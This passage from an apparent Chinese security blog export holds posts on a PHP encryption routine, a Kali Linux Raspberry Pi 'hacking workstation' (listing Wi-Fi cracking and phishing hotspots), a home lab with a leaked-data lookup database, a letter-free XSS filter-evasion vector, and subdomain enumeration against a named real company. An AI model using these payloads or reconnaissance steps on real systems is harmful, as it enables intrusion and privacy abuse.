class=&quot;pln&quot;&gt; $key_length = strlen($cryptkey);&lt;/span&gt;63.64. &lt;span class=&quot;pln&quot;&gt; $string = $operation == &#39;DECODE&#39; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#39;%010d&#39;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;&lt;/span&gt;65. &lt;span class=&quot;pln&quot;&gt; $string_length = strlen($string);&lt;/span&gt;66.67. &lt;span class=&quot;pln&quot;&gt; $result = &#39;&#39;;&lt;/span&gt;68. &lt;span class=&quot;pln&quot;&gt; $box = range(0, 255);&lt;/span&gt;69.70. &lt;span class=&quot;pln&quot;&gt; $rndkey = array();&lt;/span&gt;71. &lt;span class=&quot;pln&quot;&gt; for($i = 0; $i &amp;lt;= 255; $i++) {&lt;/span&gt;72. &lt;span class=&quot;pln&quot;&gt; $rndkey[$i] = ord($cryptkey[$i % $key_length]);&lt;/span&gt;73. &lt;span class=&quot;pln&quot;&gt; }&lt;/span&gt;74.75. &lt;span class=&quot;pln&quot;&gt; for($j = $i = 0; $i &amp;lt; 256; $i++) {&lt;/span&gt;76. &lt;span class=&quot;pln&quot;&gt; $j = ($j + $box[$i] + $rndkey[$i]) % 256;&lt;/span&gt;77. &lt;span class=&quot;pln&quot;&gt; $tmp = $box[$i];&lt;/span&gt;78. &lt;span class=&quot;pln&quot;&gt; $box[$i] = $box[$j];&lt;/span&gt;79. &lt;span class=&quot;pln&quot;&gt; $box[$j] = $tmp;&lt;/span&gt;80. &lt;span class=&quot;pln&quot;&gt; }&lt;/span&gt;81.82. &lt;span class=&quot;pln&quot;&gt; for($a = $j = $i = 0; $i &amp;lt; $string_length; $i++) {&lt;/span&gt;83. &lt;span class=&quot;pln&quot;&gt; $a = ($a + 1) % 256;&lt;/span&gt;84. &lt;span class=&quot;pln&quot;&gt; $j = ($j + $box[$a]) % 256;&lt;/span&gt;85. &lt;span class=&quot;pln&quot;&gt; $tmp = $box[$a];&lt;/span&gt;86. &lt;span class=&quot;pln&quot;&gt; $box[$a] = $box[$j];&lt;/span&gt;87. &lt;span class=&quot;pln&quot;&gt; $box[$j] = $tmp;&lt;/span&gt;88. &lt;span class=&quot;pln&quot;&gt; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));&lt;/span&gt;89. &lt;span class=&quot;pln&quot;&gt; }&lt;/span&gt;90.91. &lt;span class=&quot;pln&quot;&gt; if($operation == &#39;DECODE&#39;) {&lt;/span&gt;92. &lt;span class=&quot;pln&quot;&gt; if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &amp;gt; 0) &amp;amp;&amp;amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {&lt;/span&gt;93. &lt;span class=&quot;pln&quot;&gt; return substr($result, 26);&lt;/span&gt;94. &lt;span class=&quot;pln&quot;&gt; } else {&lt;/span&gt;95. &lt;span class=&quot;pln&quot;&gt; return &#39;&#39;;&lt;/span&gt;96. &lt;span class=&quot;pln&quot;&gt; }&lt;/span&gt;97. &lt;span class=&quot;pln&quot;&gt; } else {&lt;/span&gt;98. &lt;span class=&quot;pln&quot;&gt; return $keyc.str_replace(&#39;=&#39;, &#39;&#39;, base64_encode($result));&lt;/span&gt;99. &lt;span class=&quot;pln&quot;&gt; }&lt;/span&gt;100.101. &lt;span class=&quot;pln&quot;&gt;}&lt;/span&gt;102. &lt;span class=&quot;pun&quot;&gt;?&amp;gt;&lt;/span&gt; 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[怎样用树莓派和Kali Linux构建便携式黑客工作站]]></title>
    <url>%2F2015%2F11%2F03%2Fe6-80-8e-e6-a0-b7-e7-94-a8-e6-a0-91-e8-8e-93-e6-b4-be-e5-92-8ckali-linux-e6-9e-84-e5-bb-ba-e4-be-bf-e6-90-ba-e5-bc-8f-e9-bb-91-e5-ae-a2-e5-b7-a5-e4-bd-9c-e7-ab-99%2F</url>
    <content type="text"><![CDATA[怎样用树莓派和Kali Linux构建便携式黑客工作站&lt;o:p&gt;&lt;/o:p&gt; 0x01工欲善其事，必先利其器 &nbsp;&nbsp;&nbsp;&nbsp;1.树莓派（B+或2）&lt;o:p&gt;&lt;/o:p&gt;&nbsp;&nbsp;&nbsp;&nbsp;2.5V充电宝一枚&lt;o:p&gt;&lt;/o:p&gt;&nbsp;&nbsp;&nbsp;&nbsp;3.WIFI模块&lt;o:p&gt;&lt;/o:p&gt;&nbsp;&nbsp;&nbsp;&nbsp;4.8g SD卡&lt;o:p&gt;&lt;/o:p&gt;&nbsp;&nbsp;&nbsp;&nbsp;5.PiTFT触屏&lt;o:p&gt;&lt;/o:p&gt;&nbsp;&nbsp;&nbsp;&nbsp;6.键盘&lt;o:p&gt;&lt;/o:p&gt;&nbsp;&nbsp;&nbsp;&nbsp;7.保护壳&lt;o:p&gt;&lt;/o:p&gt;&nbsp;&nbsp;&nbsp;&nbsp;8.桌面电脑（平台初始化安装工作）&lt;o:p&gt;&lt;/o:p&gt;0x02 在树莓派上安装kali1.详细安装流程: &lt;o:p&gt;&lt;/o:p&gt;http://lifehacker.com/5976912/a-beginners-guide-to-diying-with-the-raspberry-pi#_ga=1.265570311.968941705.1436971740&lt;o:p&gt;&lt;/o:p&gt;2.怎样用windows安装kali到你的SD卡（简略版）&lt;o:p&gt;&lt;/o:p&gt;a)下载KaliLinux Raspberry TFT image并解压获得里面的.img文件。&lt;o:p&gt;&lt;/o:p&gt;注意：加入你没有触屏，请下载regular版本。&lt;o:p&gt;&lt;/o:p&gt;b)下载Win32DiskImager并解压获得安装文件&lt;o:p&gt;&lt;/o:p&gt;c)用读卡器插你的SD卡进PC&lt;o:p&gt;&lt;/o:p&gt;d)打开Win32DiskImager.exe（win7和win8等请用管理员权限打开）&lt;o:p&gt;&lt;/o:p&gt;e)加入SD卡没有被识别，可以点击菜单栏中的Device选项选择SD卡&lt;o:p&gt;&lt;/o:p&gt;f)在工具的镜像文件选择区，选择你下载的.img镜像&lt;o:p&gt;&lt;/o:p&gt;g)点击write按钮，写入镜像&lt;o:p&gt;&lt;/o:p&gt;3.在OS X系统上安装kali进SD卡&lt;o:p&gt;&lt;/o:p&gt;a)下载PiTFT镜像并解压获得.img文件，同理如果没有屏幕请下载regular镜像&lt;o:p&gt;&lt;/o:p&gt;b)下载RPi-sdcard builder并解压&lt;o:p&gt;&lt;/o:p&gt;c)插SD卡到你额Mac&lt;o:p&gt;&lt;/o:p&gt;d)打开RPi-SD并加载.img镜像&lt;o:p&gt;&lt;/o:p&gt;e)检测SD卡是否被加载，输入管理员密码（加载SD卡得时候有弹框需要输入）&lt;o:p&gt;&lt;/o:p&gt;f)双击挂在盘，弹出盘，别直接拔掉&lt;o:p&gt;&lt;/o:p&gt;g)然后插入到树莓派&lt;o:p&gt;&lt;/o:p&gt;4.安装显示屏&lt;o:p&gt;&lt;/o:p&gt;显示屏安装特别方便，由于树莓派有GPIO（通用输入输出）针脚，直接插上就好。&lt;o:p&gt;&lt;/o:p&gt;5.插上wifi、键盘并通电&lt;o:p&gt;&lt;/o:p&gt;固定好显示器以后，我们接上其他的几个硬件（wifi、键盘、充电宝）。由于树莓派提供了4个usb接口，因此插上wifi和键盘完全没有问题。&lt;o:p&gt;&lt;/o:p&gt;然后就等待启动，树莓派期待有点慢，耐心等待，成功期待会停留在一个登陆界面。&lt;o:p&gt;&lt;/o:p&gt;6.开启wifi&lt;o:p&gt;&lt;/o:p&gt;现在我们登陆系统，开启wifi，这样就能很好的使用kali里面的工具了，kali将自动识别wifi模块，然后你连接你自己的wifi热点。首先，我们需要在kali上确认几件事：&lt;o:p&gt;&lt;/o:p&gt;a)你的用户和密码是root和toor&lt;o:p&gt;&lt;/o:p&gt;b)你可以使用键盘和显示屏超控你的树莓派了，并打开一个命令行&lt;o:p&gt;&lt;/o:p&gt;c)然后设置wifi，用nano工具打开/etc/network/interfaces&lt;o:p&gt;&lt;/o:p&gt;d)增加如下文本：&lt;o:p&gt;&lt;/o:p&gt;auto wlan0 ifacewlan0 inet dhcp wpa-ssid “your network name” wpa-psk “the network password”&lt;o:p&gt;&lt;/o:p&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编辑完成使用Ctrl+X保存，现在你的wifi应该可以正常工作了（如果不能工作你可以重启一下）&lt;o:p&gt;&lt;/o:p&gt;7.改变密码&lt;o:p&gt;&lt;/o:p&gt;在你使用它之前请确保你是修改了密码（虽然很少有人有同样的hack能力，但如果遇到了，被搞了就不好了）。&lt;o:p&gt;&lt;/o:p&gt;a)在命令行下输入passwd，并按enter键&lt;o:p&gt;&lt;/o:p&gt;b)输入新密码并确认&lt;o:p&gt;&lt;/o:p&gt;c)输入dpkg-reconfigureopenssh-server并按Enter&lt;o:p&gt;&lt;/o:p&gt;现在你的小型便携式系统设置加固完成&lt;o:p&gt;&lt;/o:p&gt;8.你能用这个设备干什么&lt;o:p&gt;&lt;/o:p&gt;至此你的小型便携式黑客工作站就设置完成了，你可以使用它安装你想要的程序，如果你不知道怎么使用它，下面有一些好的使用案例：&lt;o:p&gt;&lt;/o:p&gt;l用ssh连接树莓派&lt;o:p&gt;&lt;/o:p&gt;l学习基础命令行&lt;o:p&gt;&lt;/o:p&gt;l破解wifi密码，常见钓鱼热点，和流量劫持&lt;o:p&gt;&lt;/o:p&gt;l监视网络中得流量&lt;o:p&gt;&lt;/o:p&gt;l&nbsp;&nbsp; 更多的kali指导&lt;o:p&gt;&lt;/o:p&gt;“The world is your oyster.Hack responsibly, everyone.”&lt;o:p&gt;&lt;/o:p&gt; 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[如何搭建个人服务器]]></title>
    <url>%2F2015%2F10%2F19%2Fe5-a6-82-e4-bd-95-e6-90-ad-e5-bb-ba-e4-b8-aa-e4-ba-ba-e6-9c-8d-e5-8a-a1-e5-99-a8%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 为了方便随时随地都可以搞站，又不想实时都背一个特重的笔记本。轻薄性的笔记本性能又跟不上，所以我们可以在家里放一个个人服务器。 “工欲善其事，必先利其器”硬件：intel NUC（配置自选）软件：vmware exsi 6.01.获取vmware exsi 6.0镜像&nbsp; &nbsp;原文： http://www.virten.net/2015/03/esxi-6-0-image-for-intel-nuc/（文中提供3中方法，下文这种经测试最好用）1. Download and extraxt&nbsp;ESXi-Customizer2. Download required packages (Place both files in C:\esx) –&nbsp;ESXi 6.0 ESXi ISO image&nbsp;(VMware-VMvisor-Installer-6.0.0-2494585.x86_64.iso)–&nbsp;Sata-xahci Offline Bundle&nbsp;(Provided by&nbsp;v-front.de)3. Run&nbsp;ESXi-Customizer.cmd4. Select ESXi ISO and Sata-xahci package5. Press&nbsp;Run!6. Install ESXi on your NUC with the ISO mentioned in the message3.用vmware vSphere客户端连接进入创建虚拟机&nbsp; &nbsp; a.kali_pentest&nbsp; &nbsp; b.windows7_pentest&nbsp; &nbsp; c.社工库&nbsp; &nbsp; d.私人云笔记（leanote，集成了博客功能） 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[无字母的xss vector构造]]></title>
    <url>%2F2015%2F10%2F13%2Fe6-97-a0-e5-ad-97-e6-af-8d-e7-9a-84xss-vector-e6-9e-84-e9-80-a0%2F</url>
    <content type="text"><![CDATA[0x00 前言 &nbsp; &nbsp;今天看见mickey发的一个连接，关于字母js的构造，想起前端时间ctf中的jsfuck，于是写翻译以下，写出来和大家分享。0x01 jsfuckjsfuck大家应该都很熟悉了，在ctf中经常出现。在线转平台：http://utf-8.jp/public/jsfuck.html&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;http://www.jsfuck.com/ 编码规则： &lt;span class=&quot;kwd&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;![]&lt;/span&gt; &lt;span class=&quot;kwd&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!![]&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;undefined &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[][[]]&lt;/span&gt; &lt;span class=&quot;typ&quot;&gt;NaN&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+[![]]&lt;/span&gt; &lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+[]&lt;/span&gt; &lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+!+[]&lt;/span&gt; &lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!+[]+!+[]&lt;/span&gt; &lt;span class=&quot;lit&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[+!+[]]+[+[]]&lt;/span&gt; &lt;span class=&quot;typ&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;typ&quot;&gt;Number&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+[]&lt;/span&gt; &lt;span class=&quot;typ&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[]+[]&lt;/span&gt; &lt;span class=&quot;typ&quot;&gt;Boolean&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;![]&lt;/span&gt; &lt;span class=&quot;typ&quot;&gt;Function&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[][&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;filter&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;eval &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[][&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;filter&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;constructor&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; CODE &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)()&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;window &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[][&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;filter&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;constructor&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;return this&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)()&lt;/span&gt;0x02 新规则&nbsp; &nbsp; 在《constructing-an-xss-vector-using-no-letters》篇文章中有几个新规则比较有意思，和大家分析下。我们分析下面这段代码： &lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+{})[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]][(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+{})[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+{})[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+((&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+{})[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]])+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+{})[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+{})[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]](((!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;])+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;(1)&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)()&lt;/span&gt;我们分片分析这个xss vector &lt;span class=&quot;pun&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+{})[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;false =&gt;!1+””true =&gt; !0+””[object Object] =&gt; ‘’+{}通过这3个基础向量，我们可以构造一个””[“sub”]出来functionfunction sub() { [native code] } =&gt; (“”[(!1+””)[3]+(!0+””)[2]+(‘’+{})[2]])+””“”[“sub”][“constructor”]这个结构相当于function(),我们调用它能够定义一个函数用仅仅一个字符串因此，最上面的那段代码就是””[“sub”]“constructor”“)()，这段代码相当于function anonymous() {alert(1)}();0x03 总结 看到这篇文章仅仅觉得有意思，所以翻译并分析给大家看看，实际场景的利用还需思考。原文连接：https://inventropy.us/blog/constructing-an-xss-vector-using-no-letters 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[二级域名查询处理]]></title>
    <url>%2F2015%2F09%2F24%2Fe4-ba-8c-e7-ba-a7-e5-9f-9f-e5-90-8d-e6-9f-a5-e8-af-a2-e5-a4-84-e7-90-86%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 安全测试的时候用到的一些小脚本1.查二级域名&nbsp; &nbsp;&nbsp;python flint.py rrset &amp;#42.zto.cn | grep “zto.cn”| awk ‘{print $1}’ | sort | uniq | grep -v “&amp;#42”&nbsp;2.判断是否存在&nbsp;&nbsp;1. &lt;span class=&quot;com&quot;&gt;# -&amp;#42- coding:utf-8 -&amp;#42-&lt;/span&gt;2. &lt;span class=&quot;kwd&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;3. &lt;span class=&quot;kwd&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; re&lt;/span&gt;4.5. &lt;span class=&quot;kwd&quot;&gt;def&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; alivecheck&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt; url &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span 